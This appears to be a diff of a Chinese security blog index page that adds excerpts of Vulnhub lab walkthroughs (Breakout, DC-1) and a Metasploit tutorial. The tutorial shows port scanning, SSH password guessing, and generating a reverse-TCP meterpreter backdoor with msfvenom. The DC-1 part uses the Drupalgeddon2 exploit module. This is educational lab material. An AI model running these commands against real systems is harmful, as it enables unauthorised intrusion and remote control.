@@ -187,7 +187,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ICS/" rel="tag">ICS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">Phar反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf%E6%AF%94%E8%B5%9B/" rel="tag">ctf比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/md5/" rel="tag">md5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">php反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%9F%BA%E7%A1%80/" rel="tag">web基础</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%9F%BA%E7%A1%80%EF%BC%8CJWT/" rel="tag">web基础，JWT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag">web渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%81SQL%E6%B3%A8%E5%85%A5%E3%80%81%E5%8F%8D%E5%BC%B9shell/" rel="tag">渗透测试、SQL注入、反弹shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag">靶机</a></li></ul>
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ICS/" rel="tag">ICS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">Phar反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf%E6%AF%94%E8%B5%9B/" rel="tag">ctf比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/md5/" rel="tag">md5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">php反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%9F%BA%E7%A1%80/" rel="tag">web基础</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%9F%BA%E7%A1%80%EF%BC%8CJWT/" rel="tag">web基础，JWT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag">web渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%81SQL%E6%B3%A8%E5%85%A5%E3%80%81%E5%8F%8D%E5%BC%B9shell/" rel="tag">渗透测试、SQL注入、反弹shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag">靶机</a></li></ul>
                     </div>
                 </section>
                 
@@ -261,6 +261,489 @@
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-Vulnhub渗透测试-Breakout" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/11/04/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Breakout/" class="article-date">
+      <time datetime="2022-11-04T06:31:38.000Z" itemprop="datePublished">2022-11-04</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/11/04/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Breakout/">Vulnhub渗透测试-Breakout</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="Vulnhub渗透测试-Breakout"><a href="#Vulnhub渗透测试-Breakout" class="headerlink" title="Vulnhub渗透测试-Breakout"></a>Vulnhub渗透测试-Breakout</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p> 1、查看靶机ip地址</p>
+<p><code>arp-scan -l</code></p>
+<p><img src="/2022/11/04/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Breakout/1.png" alt="image-20221104144336697"></p>
+<p>由此kali和靶机的ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali:192.168.19.128</span><br><span class="line">靶机：192.168.19.129</span><br></pre></td></tr></table></figure>
+
+<p>2、查看开放端口</p>
+<p><img src="/2022/11/04/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Breakout/2.png" alt="image-20221104145127953"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">139端口（netbios-ssn)：</span><br><span class="line">145端口：是一个共享文件夹和打印机端口，可以访问一些共享文件夹和一些共享打印机</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-渗透工具---MSF的使用" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/08/22/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7---MSF%E7%9A%84%E4%BD%BF%E7%94%A8/" class="article-date">
+      <time datetime="2022-08-22T09:12:46.290Z" itemprop="datePublished">2022-08-22</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="渗透工具—MSF的使用"><a href="#渗透工具—MSF的使用" class="headerlink" title="渗透工具—MSF的使用"></a>渗透工具—MSF的使用</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Metasploit是一款开源安全漏洞检测工具，附带数百个已知的软件漏洞，并保持频繁更新，是强大的渗透测试框架。msf使用的是postgresql数据库。</p>
+<h4 id="MSF模块"><a href="#MSF模块" class="headerlink" title="MSF模块"></a>MSF模块</h4><p>1、辅助模块auxiliary</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">负责执行信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等</span><br></pre></td></tr></table></figure>
+
+<p>2、攻击模块exploits</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用发现的安全漏洞或配置弱点对远程目标系统进行攻击，从而获得对远程目标系统访问权的代码组件。此模块对应的每一个具体漏洞的攻击方法（主动、被动）</span><br><span class="line">主动渗透攻击：发送网络数据，触发安全漏洞</span><br><span class="line">被动渗透攻击：浏览器软件漏洞攻击和文件格式漏洞攻击，引诱目标用户打开触发</span><br></pre></td></tr></table></figure>
+
+<p>3、攻击载荷模块payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击成功后促使靶机运行的一段植入代码，比如反弹shell、bind shell等</span><br></pre></td></tr></table></figure>
+
+<p>4、后渗透攻击模块post</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在受控系统中进行各种各样的后渗透攻击动作，比如获取敏感信息、进一步拓展、实施跳板攻击等</span><br></pre></td></tr></table></figure>
+
+<p>5、编码模块Encoders</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将攻击载荷进行编码，来绕过防护软件拦截</span><br></pre></td></tr></table></figure>
+
+<p>6、免杀模块evasion</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以创建反杀毒软件的木马</span><br></pre></td></tr></table></figure>
+
+<h4 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h4><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>use</td>
+<td>使用某个模块</td>
+</tr>
+<tr>
+<td>info</td>
+<td>查看模块的详细信息</td>
+</tr>
+<tr>
+<td>set</td>
+<td>模块选型设置</td>
+</tr>
+<tr>
+<td>exploit&#x2F;run</td>
+<td>启动脚本</td>
+</tr>
+<tr>
+<td>search</td>
+<td>搜索关键字</td>
+</tr>
+<tr>
+<td>show options</td>
+<td>查看脚本配置选项</td>
+</tr>
+<tr>
+<td>show targets</td>
+<td>显示适用的主机类型</td>
+</tr>
+<tr>
+<td>show payloads</td>
+<td>显示适用的payload类型</td>
+</tr>
+</tbody></table>
+<h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>（1）进入框架：<code>msfconsole</code></p>
+<p>（2）使用search命令查找相关漏洞：<code>search xxx</code></p>
+<p>（3）使用use进入模块：<code>use xxx</code></p>
+<p>（4）使用info查看模块信息：<code>info</code></p>
+<p>（5）设置攻击载荷：<code>set payload xxx</code></p>
+<p>（6）查看模块需要配置的参数：<code>show options</code></p>
+<p>（7）设置参数：<code>set RHOST ip</code></p>
+<p>（8）攻击：<code>exploit/run</code></p>
+<p>（9）后渗透阶段</p>
+<p><strong>不同的攻击用到的步骤也不一样，这是一成不变的，需要灵活使用。也可以将攻击代码写入configure.rc配置文件中，然后使用命令<code>msfconsole -r configure.rc</code>进行自动攻击</strong></p>
+<h3 id="MSF信息收集"><a href="#MSF信息收集" class="headerlink" title="MSF信息收集"></a>MSF信息收集</h3><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><p>目录<code>auxiliary/scanner/discovery/</code>下有7个脚本用来信息收集</p>
+<p><img src="/2022/08/22/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7---MSF%E7%9A%84%E4%BD%BF%E7%94%A8/1.png" alt="image-20220822174528065"></p>
+<p>（1）arp-sweep：arp扫描本地网络发现</p>
+<p>（2）empty_udp：UDP空探测器</p>
+<p>（3）ipv6_multicast_ping：IPv6链路本地&#x2F;节点本地Ping发现</p>
+<p>（4）ipv6_neighbor：IPv6本地邻居发现</p>
+<p>（5）ipv6_neighbor_router_advertisement：使用路由器通告的IPv6本地邻居发现</p>
+<p>（6）udp_probe：UDP服务探测器</p>
+<p>（7）udp_sweep：UDP服务清理程序</p>
+<p>例如：arp_sweep</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/arp_sweep</span><br><span class="line">show options</span><br><span class="line">set RHOSTS ip</span><br><span class="line">set threads xx</span><br><span class="line">run/exploit</span><br></pre></td></tr></table></figure>
+
+<p>show options：</p>
+<p><img src="/2022/08/22/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7---MSF%E7%9A%84%E4%BD%BF%E7%94%A8/2.png" alt="image-20220822181714767"></p>
+<p>RHOSTS、THREADS和TIMEOUT在设置时是必要的，但后两个有初始的设置</p>
+<p><img src="/2022/08/22/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7---MSF%E7%9A%84%E4%BD%BF%E7%94%A8/3.png" alt="image-20220822232122499"></p>
+<p>发现192.168.19.132&#x2F;24网段有4个主机</p>
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>使用<code>auxiliary/scanner/portscan/*</code>模块，一般情况下推荐使用syn端口扫描器，扫描速度快且不容易被发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/syn</span><br><span class="line">show options</span><br><span class="line">set RHOSTS ip</span><br><span class="line">set POSTS 1-65535</span><br><span class="line">set threads 50000</span><br><span class="line">run/exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/22/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7---MSF%E7%9A%84%E4%BD%BF%E7%94%A8/4.png" alt="image-20220823001736927"></p>
+<p>发现有三个端口开放</p>
+<h4 id="探测服务详细信息"><a href="#探测服务详细信息" class="headerlink" title="探测服务详细信息"></a>探测服务详细信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap A -p- -sS sC -T4 -Pn 192.168.19.132</span><br></pre></td></tr></table></figure>
+
+<h4 id="服务查点"><a href="#服务查点" class="headerlink" title="服务查点"></a>服务查点</h4><p>msf中scanner辅助模块中，很多用于服务扫描和查点的工具，常以<code>[service_name]_version</code>和<code>[service_name]_login</code>命名</p>
+<p><code>[service_name]_version</code>可以用于遍历网络中包含了某种服务的主机，并进一步确定服务的版本</p>
+<p><code>[service_name]_login</code>可以对某种服务进行口令探测攻击</p>
+<p>例如：SSH服务扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search ssh_version</span><br><span class="line">use 3</span><br><span class="line">show options</span><br><span class="line">set RHOSTS ip</span><br><span class="line">set threads xx</span><br><span class="line">run/exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/22/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7---MSF%E7%9A%84%E4%BD%BF%E7%94%A8/5.png" alt="image-20220823002549607"></p>
+<p>发现192.168.19.134的22端口ssh服务开启了</p>
+<p><strong>其他服务查点：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/telnet/telnet_version      #telnet服务扫描</span><br><span class="line">use auxiliary/scanner/oracle/tnslsnr_version     #oracle服务扫描</span><br><span class="line">use auxiliary/scanner/mssql/mssql_ping			 #mssql扫描</span><br><span class="line">use auxiliary/scanner/mysql/mysql_version		  #mysql扫描</span><br><span class="line">use auxiliary/scanner/ftp/ftp_version			 #ftp扫描</span><br><span class="line">use auxiliary/scanner/http/http_version			 #http扫描</span><br></pre></td></tr></table></figure>
+
+<h4 id="口令猜测"><a href="#口令猜测" class="headerlink" title="口令猜测"></a>口令猜测</h4><p>kali中字典位置：<code>/usr/share/wordlists</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search ssh_login</span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">set RHOST 192.168.19.134</span><br><span class="line">set USERname kail</span><br><span class="line">set PASS_FILE /xxxx/xxxx #路径为字典位置</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h4 id="网站敏感目录扫描"><a href="#网站敏感目录扫描" class="headerlink" title="网站敏感目录扫描"></a>网站敏感目录扫描</h4><p>可以自行添加字典</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/http/dir_scanner</span><br><span class="line">set RHOST 192.168.19.134</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/22/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7---MSF%E7%9A%84%E4%BD%BF%E7%94%A8/6.png" alt="image-20220823004406624"></p>
+<h3 id="漏洞利用（exploit）"><a href="#漏洞利用（exploit）" class="headerlink" title="漏洞利用（exploit）"></a>漏洞利用（exploit）</h3><p>漏洞利用exploit（exp），即对漏洞进行攻击的代码</p>
+<p>MSF中漏洞利用模块路径：<code>/usr/share/metasploit-framework/modules/exploits</code>，有针对不同平台的exploit。</p>
+<p><img src="/2022/08/22/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7---MSF%E7%9A%84%E4%BD%BF%E7%94%A8/7.png" alt="image-20220824183642528"></p>
+<p><strong>windows:</strong></p>
+<p>针对不同服务的漏洞利用（攻击代码）：</p>
+<p><img src="/2022/08/22/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7---MSF%E7%9A%84%E4%BD%BF%E7%94%A8/8.png" alt="image-20220824183857192"></p>
+<p>例如：smb服务（用于web连接和客户端与服务器之间的信息沟通，该服务经常爆出漏洞，永恒之蓝漏洞（ms17_010）就基于这个服务</p>
+<p><img src="/2022/08/22/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7---MSF%E7%9A%84%E4%BD%BF%E7%94%A8/9.png" alt="image-20220824184606595"></p>
+<h3 id="攻击载荷（payload）"><a href="#攻击载荷（payload）" class="headerlink" title="攻击载荷（payload）"></a>攻击载荷（payload）</h3><p>攻击载荷payload模块路径：<code>/usr/share/metasploit-framework/modules/payloads</code></p>
+<p><img src="/2022/08/22/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7---MSF%E7%9A%84%E4%BD%BF%E7%94%A8/10.png" alt="image-20220824195759239"></p>
+<p>Payload中包含攻击进入目标主机后需要在远程系统中运行的恶意代码。在MSF中Payload是一种特殊模块，它们能够以漏洞利用模块运行，并能够利用目标系统中的安全漏洞实施攻击。</p>
+<p><strong>Shellcode：</strong>在渗透攻击时作为攻击载荷运行的一组机器指令（汇编语言）。在大多数情况下，目标系统执行了shellcode这一组指令后，才会提供一个命令行shell。</p>
+<p>payload模块有三种类型：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-Single（独立载荷）</span><br><span class="line">可直接植入目标系统并执行相应的程序（payload:shell_bind_tcp)</span><br><span class="line"></span><br><span class="line">-Stager（传输器载荷）</span><br><span class="line">用于目标机与攻击机之间建立稳定的网络连接，与传输载荷配合攻击。</span><br><span class="line">分类：bind型 需要攻击机主动连接目标端口</span><br><span class="line">    reverse型 目标机会反连接攻击机，提前设定号连接攻击机的IP地址和端口</span><br><span class="line"></span><br><span class="line">-Stage（传输体载荷）</span><br><span class="line">stager建立连接后，攻击机将stage传输给目标机，有stager进行相应处理，将控制权转交给stage</span><br><span class="line">例：</span><br><span class="line">得到目标机的shell或meterpreter控制程序运行，攻击机可以在本段输入相应命令控制目标机</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p><code>exploit+payload</code>，exploit是指利用漏洞的一个过程和方法，最终的目的是为了执行payload，payload是真正实现攻击的代码。在使用exploit时，使用use来调用模块，用set调用各种payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use payload/windows/shell_bind_tcp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/22/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7---MSF%E7%9A%84%E4%BD%BF%E7%94%A8/11.png" alt="image-20220824235255291"></p>
+<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>直接使用payload，但第一步同方法一，接着可以使用generate命令来生成payload</p>
+<p><img src="/2022/08/22/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7---MSF%E7%9A%84%E4%BD%BF%E7%94%A8/12.png" alt="image-20220824235706500"></p>
+<p>获得payload的一些基本信息和设置的参数，buf时payload的16进制表示方式。</p>
+<p><strong>但是</strong>，payload中可能存在所谓的“坏字符”，它们在执行过程中会被过滤掉或以其他语义的方式被执行，导致payload在目标系统上执行和预期结果不一致。</p>
+<p>例：缓冲区溢出中，会把“\x00”当作一个“坏字符”，导致shellcode无法执行</p>
+<h3 id="MSF后门生成"><a href="#MSF后门生成" class="headerlink" title="MSF后门生成"></a>MSF后门生成</h3><p>msfvenom常用命令参数</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-l</td>
+<td>列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops,…all</td>
+</tr>
+<tr>
+<td>-p</td>
+<td>指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的</td>
+</tr>
+<tr>
+<td>-f</td>
+<td>指定输出格式</td>
+</tr>
+<tr>
+<td>-e</td>
+<td>指定需要使用的encoder（编码器）编码免杀</td>
+</tr>
+<tr>
+<td>-a</td>
+<td>指定payload的目标架构，例如x86 还是 x64 还是 x86_64</td>
+</tr>
+<tr>
+<td>-o</td>
+<td>指定创建好的payload的存放位置</td>
+</tr>
+<tr>
+<td>-b</td>
+<td>设定规避字符集，指定需要过滤的坏字符。例如：不使用 ‘\x0f’、’\x00’</td>
+</tr>
+<tr>
+<td>-n</td>
+<td>为payload预先指定一个NOP滑动长度</td>
+</tr>
+<tr>
+<td>-s</td>
+<td>设定有效攻击荷载的最大长度生成payload的最大长度，就是文件大小</td>
+</tr>
+<tr>
+<td>-i</td>
+<td>指定payload的编码次数</td>
+</tr>
+<tr>
+<td>-c</td>
+<td>指定一个附加的win32 shellcode文件</td>
+</tr>
+<tr>
+<td>-x</td>
+<td>指定一个自定义的可执行文件作为模板。例如：原先有个正常文件normal.exe 可以通过这个选项把后门捆绑到这个程序上面</td>
+</tr>
+<tr>
+<td>-k</td>
+<td>保护模板程序的动作，注入的payload作为一个新的进程运行。例如：原先有个正常文件normal.exe 可以通过这个选项把后门捆绑到这个程序上面</td>
+</tr>
+<tr>
+<td>-v</td>
+<td>指定一个自定义的变量，以确定输出格式</td>
+</tr>
+<tr>
+<td>-t</td>
+<td>从stdin读取有效负载时等待的秒数（默认为30，0表示禁用)</td>
+</tr>
+<tr>
+<td>-h</td>
+<td>查看帮助选项</td>
+</tr>
+<tr>
+<td>-platform</td>
+<td>指定payload的目标平台</td>
+</tr>
+</tbody></table>
+<h4 id="普通生成"><a href="#普通生成" class="headerlink" title="普通生成"></a>普通生成</h4><p>生成命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p 有效载荷 -f 输出格式 -o 输出文件</span><br><span class="line">例：msfvenom -p windows/meterpreter/reverse_tcp -f exe -o payload.exe</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-Vulnhub渗透测试-DC1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/" class="article-date">
+      <time datetime="2022-08-17T08:51:18.000Z" itemprop="datePublished">2022-08-17</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/">Vulnhub渗透测试-DC1</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="Vulnhub渗透测试—DC1"><a href="#Vulnhub渗透测试—DC1" class="headerlink" title="Vulnhub渗透测试—DC1"></a>Vulnhub渗透测试—DC1</h2><p>DC-1靶机一共设置了5个flag</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>（1）使用kali中的netdiscover命令<code>netdiscover -r 192.168.19.0/16</code>，可以判断某个IP地址是否被使用，从而发现网络中存活的主机，结合DC-1的物理地址得到DC-1的IP地址</p>
+<img src="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/1.png" alt="image-20220828221906239" style="zoom:67%;">
+
+<img src="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/2.png" alt="image-20220828222150481" style="zoom: 50%;">
+
+<p>​       或使用<code>arp-scan -l</code>探测IP地址</p>
+<img src="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/3.png" alt="image-20220828225832295" style="zoom:67%;">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击机：kali：192.168.19.135</span><br><span class="line">靶机：DC-1：192.168.19.140</span><br><span class="line">靶机和攻击机都为NAT连接模式</span><br></pre></td></tr></table></figure>
+
+<p>（2）得到IP地址后查看靶机打开了哪些端口<code>nmap -sS -sV -A -n 192.168.19.140</code></p>
+<img src="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/4.png" alt="image-20220828230326645" style="zoom:67%;">
+
+<p>打开了22、80、111端口，111端口不太熟悉</p>
+<p>（3）目录扫描</p>
+<p><img src="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/7.png" alt="image-20220825180255020"></p>
+<p>​      发现有robots.txt存在</p>
+<p>（4)查看robots.txt</p>
+<p>​     没什么有用的信息</p>
+<img src="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/6.png" alt="image-20220828231141526" style="zoom:67%;">
+
+<p>（5）先看看80端口吧</p>
+<p>打开<code>http://192.168.19.140</code>发现是一个登录页面，且CMS是Drupal 7</p>
+<img src="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/7.png" alt="image-20220828230326645" style="zoom:67%;">
+
+<p>或whatweb命令查看</p>
+<p><img src="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/8.png" alt="image-20220828230531785"></p>
+<p>使用msf查找Drupal版本7的漏洞</p>
+<p><img src="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/9.png" alt="image-20220817184317211"></p>
+<p>找到的8个漏洞模块</p>
+<p>（6）searchsploit</p>
+<p><code>searchsploit</code>是一个用于<code>Exploit-DB</code>的命令行搜索工具，可以帮助我们查找渗透模块。</p>
+<p><img src="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/10.png" alt="image-20220825005429748"></p>
+<p>发现大部分漏洞是RCE，也有的RCE可以通过Metasploit利用，其中<code>Drupalgeddon2</code>漏洞模块可以在msf被利用，先从这里下手</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><p>（1）利用漏洞模块<code>use exploit/unix/webapp/drupal_drupalgeddon2</code></p>
+<p>（2）查看选项<code>show options</code>，有必要和非必要的参数</p>
+<p><img src="/2022/08/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-DC1/11.png" alt="image-20220828232521776"></p>
